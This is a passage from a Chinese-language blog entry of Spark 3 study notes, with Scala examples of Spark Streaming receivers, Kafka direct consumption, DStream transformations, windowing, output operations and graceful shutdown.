ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    自定义数据采集器</span></span><br><span class="line"><span class="comment">    1. 继承Receiver，定义泛型, 传递参数</span></span><br><span class="line"><span class="comment">    2. 重写方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyReceiver</span> <span class="keyword">extends</span> <span class="title">Receiver</span>[<span class="type">String</span>](<span class="params"><span class="type">StorageLevel</span>.<span class="type">MEMORY_ONLY</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> flg = <span class="literal">true</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">onStart</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="type">Thread</span>(<span class="keyword">new</span> <span class="type">Runnable</span> &#123;</span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">                    <span class="keyword">while</span> ( flg ) &#123;</span><br><span class="line">                        <span class="keyword">val</span> message = <span class="string">"采集的数据为："</span> + <span class="keyword">new</span> <span class="type">Random</span>().nextInt(<span class="number">10</span>).toString</span><br><span class="line">                        store(message)</span><br><span class="line">                        <span class="type">Thread</span>.sleep(<span class="number">500</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">onStop</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            flg = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Kafka 数据源（面试、开发重点）</strong></p><p>ReceiverAPI：需要一个专门的Executor 去接收数据，然后发送给其他的 Executor 做计算。存在的问题，接收数据的Executor 和计算的Executor 速度会有所不同，特别在接收数据的Executor 速度大于计算的Executor 速度，会导致计算数据的节点内存溢出。早期版本中提供此方式，当前版本不适用</p><p>DirectAPI：是由计算的Executor 来主动消费Kafka 的数据，速度由自身控制，这里只讲这个模式，首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming-kafka-0-10_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写代码</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming04_Kafka</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> kafkaPara: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>] = <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>](</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">BOOTSTRAP_SERVERS_CONFIG</span> -&gt; <span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>,</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">GROUP_ID_CONFIG</span> -&gt; <span class="string">"atguigu"</span>,</span><br><span class="line">            <span class="string">"key.deserializer"</span> -&gt; <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span>,</span><br><span class="line">            <span class="string">"value.deserializer"</span> -&gt; <span class="string">"org.apache.kafka.common.serialization.StringDeserializer"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> kafkaDataDS: <span class="type">InputDStream</span>[<span class="type">ConsumerRecord</span>[<span class="type">String</span>, <span class="type">String</span>]] = <span class="type">KafkaUtils</span>.createDirectStream[<span class="type">String</span>, <span class="type">String</span>](</span><br><span class="line">            ssc,</span><br><span class="line">            <span class="type">LocationStrategies</span>.<span class="type">PreferConsistent</span>,</span><br><span class="line">            <span class="type">ConsumerStrategies</span>.<span class="type">Subscribe</span>[<span class="type">String</span>, <span class="type">String</span>](<span class="type">Set</span>(<span class="string">"atguiguNew"</span>), kafkaPara)</span><br><span class="line">        )</span><br><span class="line">        kafkaDataDS.map(_.value()).print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看Kafka 消费进度</span></span><br><span class="line"><span class="comment">// bin/kafka-consumer-groups.sh --describe --bootstrap-server hadoop102:9092 --group atguigu</span></span><br></pre></td></tr></table></figure><h3 id="2-2-DStream-转换">2.2 DStream 转换</h3><p><strong>无状态转化操作</strong></p><p>无状态转化操作就是把简单的RDD 转化操作应用到每个批次上，也就是转化DStream 中的每一个RDD，即每个批次的处理不依赖于之前批次的数据</p><table><thead><tr><th><strong>Transformation</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>map(func)</td><td>对 DStream 中的各个元素进行 func 函数操作，然后返回一个新的 DStream</td></tr><tr><td>flatMap(func)</td><td>与 map 方法类似，只不过各个输入项可以被输出为零个或多个输出项</td></tr><tr><td>filter(func)</td><td>过滤出所有函数 func 返回值为 true 的 DStream 元素并返回一个新的 DStream</td></tr><tr><td>union(otherStream)</td><td>将源 DStream 和输入参数为 otherDStream 的元素合并，并返回一个新的 DStream</td></tr><tr><td>reduceByKey(func, [numTasks])</td><td>利用 func 函数对源 DStream 中的 key 进行聚合操作，然后返回新的(K，V)对构成的 DStream</td></tr><tr><td>join(otherStream, [numTasks])</td><td>输入为(K,V)、(K,W)类型的 DStream，返回一个新的(K，(V，W)类型的 DStream</td></tr><tr><td><strong>transform(func)</strong></td><td>通过 RDD-to-RDD 函数作用于 DStream 中的各个 RDD，可以是任意的 RDD 操作，从而返回一个新的 RDD</td></tr></tbody></table><p>Transform示例</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming06_State_Transform</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transform方法可以将底层RDD获取到后进行操作</span></span><br><span class="line">        <span class="comment">// 1. DStream功能不完善</span></span><br><span class="line">        <span class="comment">// 2. 需要代码周期性的执行</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Code : Driver端</span></span><br><span class="line">        <span class="keyword">val</span> newDS: <span class="type">DStream</span>[<span class="type">String</span>] = lines.transform(</span><br><span class="line">            rdd =&gt; &#123;</span><br><span class="line">                <span class="comment">// Code : Driver端，（周期性执行）</span></span><br><span class="line">                rdd.map(</span><br><span class="line">                    str =&gt; &#123;</span><br><span class="line">                        <span class="comment">// Code : Executor端</span></span><br><span class="line">                        str</span><br><span class="line">                    &#125;</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">// Code : Driver端</span></span><br><span class="line">        <span class="keyword">val</span> newDS1: <span class="type">DStream</span>[<span class="type">String</span>] = lines.map(</span><br><span class="line">            data =&gt; &#123;</span><br><span class="line">                <span class="comment">// Code : Executor端</span></span><br><span class="line">                data</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>有状态转化操作</strong></p><p>有状态转换包括基于追踪状态变化的转换(updateStateByKey)和滑动窗口的转换</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming05_State</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line">        ssc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 无状态数据操作，只对当前的采集周期内的数据进行处理</span></span><br><span class="line">        <span class="comment">// 在某些场合下，需要保留数据统计结果（状态），实现数据的汇总</span></span><br><span class="line">        <span class="comment">// 使用有状态操作时，需要设定检查点路径</span></span><br><span class="line">        <span class="keyword">val</span> datas = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToOne = datas.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">//val wordToCount = wordToOne.reduceByKey(_+_)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// updateStateByKey：根据key对数据的状态进行更新</span></span><br><span class="line">        <span class="comment">// 传递的参数中含有两个值</span></span><br><span class="line">        <span class="comment">// 第一个值表示相同的key的value数据</span></span><br><span class="line">        <span class="comment">// 第二个值表示缓存区相同key的value数据</span></span><br><span class="line">        <span class="keyword">val</span> state = wordToOne.updateStateByKey(</span><br><span class="line">            ( seq:<span class="type">Seq</span>[<span class="type">Int</span>], buff:<span class="type">Option</span>[<span class="type">Int</span>] ) =&gt; &#123;</span><br><span class="line">                <span class="keyword">val</span> newCount = buff.getOrElse(<span class="number">0</span>) + seq.sum</span><br><span class="line">                <span class="type">Option</span>(newCount)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        state.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Window Operations 可以设置窗口的大小和滑动窗口的间隔来动态的获取当前Steaming 的允许状态。所有基于窗口的操作都需要两个参数，分别为窗口时长以及滑动步长。注意：这两者都必须为采集周期大小的整数倍</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming06_State_Window</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 窗口的范围应该是采集周期的整数倍</span></span><br><span class="line">        <span class="comment">// 窗口可以滑动的，但是默认情况下，一个采集周期进行滑动</span></span><br><span class="line">        <span class="comment">// 这样的话，可能会出现重复数据的计算，为了避免这种情况，可以改变滑动的滑动（步长）</span></span><br><span class="line">        <span class="keyword">val</span> windowDS: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = wordToOne.window(<span class="type">Seconds</span>(<span class="number">6</span>), <span class="type">Seconds</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> wordToCount = windowDS.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">        wordToCount.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于Window 的操作还有如下方法：</p><ul><li>window(windowLength, slideInterval): 基于对源DStream 窗化的批次进行计算返回一个新的Dstream；</li><li>countByWindow(windowLength, slideInterval): 返回一个滑动窗口计数流中的元素个数；</li><li>reduceByWindow(func, windowLength, slideInterval): 通过使用自定义函数整合滑动区间流元素来创建一个新的单元素流；</li><li>reduceByKeyAndWindow(func, windowLength, slideInterval, [numTasks]): 当在一个(K,V) 对的DStream 上调用此函数，会返回一个新(K,V)对的 DStream，此处通过对滑动窗口中批次数据使用 reduce 函数来整合每个 key 的 value 值。</li><li>reduceByKeyAndWindow(func, invFunc, windowLength, slideInterval, [numTasks]): 这个函数是上述函数的变化版本，每个窗口的 reduce 值都是通过用前一个窗的 reduce 值来递增计算。通过 reduce 进入到滑动窗口数据并&quot;反向 reduce&quot;离开窗口的旧数据来实现这个操作。一个例子是随着窗口滑动对keys 的&quot;加&quot;“减&quot;计数。通过前边介绍可以想到，这个函数只适用于&quot;可逆的 reduce 函数”，也就是这些 reduce 函数有相应的&quot;反 reduce&quot;函数(以参数 invFunc 形式传入)。如前述函数，reduce 任务的数量通过可选参数来配置</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// reduceByKeyAndWindow : 当窗口范围比较大，但是滑动幅度比较小，那么可以采用增加数据和删除数据的方式</span></span><br><span class="line"><span class="comment">// 无需重复计算，提升性能。</span></span><br><span class="line"><span class="keyword">val</span> windowDS: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] =</span><br><span class="line">    wordToOne.reduceByKeyAndWindow(</span><br><span class="line">        (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; &#123; x + y&#125;,</span><br><span class="line">        (x:<span class="type">Int</span>, y:<span class="type">Int</span>) =&gt; &#123;x - y&#125;,</span><br><span class="line">        <span class="type">Seconds</span>(<span class="number">9</span>), <span class="type">Seconds</span>(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="2-3-DStream-输出">2.3 DStream 输出</h3><p>Output Operations 可以将 DStream 的数据输出到外部的数据库或文件系统。当某个 Output Operations 被调用时，spark streaming 程序才会开始真正的计算过程(与 RDD 的 Action 类似)</p><table><thead><tr><th><strong>Output Operation</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>print()</td><td>打印到控制台</td></tr><tr><td>saveAsTextFiles(prefix, [suffix])</td><td>保存流的内容为文本文件，文件名为&quot;prefix-TIME_IN_MS[.suffix]&quot;</td></tr><tr><td>saveAsObjectFiles(prefix,[suffix])</td><td>保存流的内容为 SequenceFile，文件名为 “prefix-TIME_IN_MS[.suffix]”</td></tr><tr><td>saveAsHadoopFiles(prefix,[suffix])</td><td>保存流的内容为 hadoop 文件，文件名为&quot;prefix-TIME_IN_MS[.suffix]&quot;</td></tr><tr><td>foreachRDD(func)</td><td>对 Dstream 里面的每个 RDD 执行 func；注意连接不能写在 driver 层面（序列化）； 如果写在 foreach 则每个 RDD 中的每一条数据都创建，得不偿失；增加 foreachPartition，在分区创建（获取）</td></tr></tbody></table><h3 id="2-4-优雅关闭">2.4 优雅关闭</h3><p>流式任务需要 7*24 小时执行，但是有时涉及到升级代码需要主动停止程序，但是分布式程序，没办法做到一个个进程去杀死，所有配置优雅的关闭就显得至关重要了。使用外部文件系统来控制内部程序关闭</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming08_Close</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           线程的关闭：</span></span><br><span class="line"><span class="comment">           val thread = new Thread()</span></span><br><span class="line"><span class="comment">           thread.start()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           thread.stop(); // 强制关闭</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        wordToOne.print()</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果想要关闭采集器，那么需要创建新的线程</span></span><br><span class="line">        <span class="comment">// 而且需要在第三方程序中增加关闭状态</span></span><br><span class="line">        <span class="keyword">new</span> <span class="type">Thread</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="type">Runnable</span> &#123;</span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">                    <span class="comment">// 优雅地关闭</span></span><br><span class="line">                    <span class="comment">// 计算节点不在接收新的数据，而是将现有的数据处理完毕，然后关闭</span></span><br><span class="line">                    <span class="comment">// Mysql : Table(stopSpark) =&gt; Row =&gt; data</span></span><br><span class="line">                    <span class="comment">// Redis : Data（K-V）</span></span><br><span class="line">                    <span class="comment">// ZK    : /stopSpark</span></span><br><span class="line">                    <span class="comment">// HDFS  : /stopSpark</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    while ( true ) &#123;</span></span><br><span class="line"><span class="comment">                        if (true) &#123;</span></span><br><span class="line"><span class="comment">                            // 获取SparkStreaming状态</span></span><br><span class="line"><span class="comment">                            val state: StreamingContextState = ssc.getState()</span></span><br><span class="line"><span class="comment">                            if ( state == StreamingContextState.ACTIVE ) &#123;</span></span><br><span class="line"><span class="comment">                                ssc.stop(true, true)</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        Thread.sleep(5000)</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line"></span><br><span class="line">                    <span class="type">Thread</span>.sleep(<span class="number">5000</span>)</span><br><span class="line">                    <span class="keyword">val</span> state: <span class="type">StreamingContextState</span> = ssc.getState()</span><br><span class="line">                    <span class="keyword">if</span> ( state == <span class="type">StreamingContextState</span>.<span class="type">ACTIVE</span> ) &#123;</span><br><span class="line">                        ssc.stop(<span class="literal">true</span>, <span class="literal">true</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">System</span>.exit(<span class="number">0</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ).start()</span><br><span class="line"></span><br><span class="line">        ssc.awaitTermination() <span class="comment">// block 阻塞main线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于优雅恢复，停止前可以保存检查点</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkStreaming09_Resume</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="type">StreamingContext</span>.getActiveOrCreate(<span class="string">"cp"</span>, ()=&gt;&#123;</span><br><span class="line">            <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"SparkStreaming"</span>)</span><br><span class="line">            <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> lines = ssc.socketTextStream(<span class="string">"localhost"</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="keyword">val</span> wordToOne = lines.map((_,<span class="number">1</span>))</span><br><span class="line">            wordToOne.print()</span><br><span class="line">            ssc</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        ssc.checkpoint(<span class="string">"cp"</span>)</span><br><span class="line"></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination() <span class="comment">// block 阻塞main线程</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Spark3学习笔记&lt;/h1&gt;
&lt;h1&gt;一、Spark 基础&lt;/h1&gt;
&lt;h2 id=&quot;1、Spark概述&quot;&gt;1、Spark概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-Spark简介&quot;&gt;1.1 Spark简介&lt;/h3&gt;
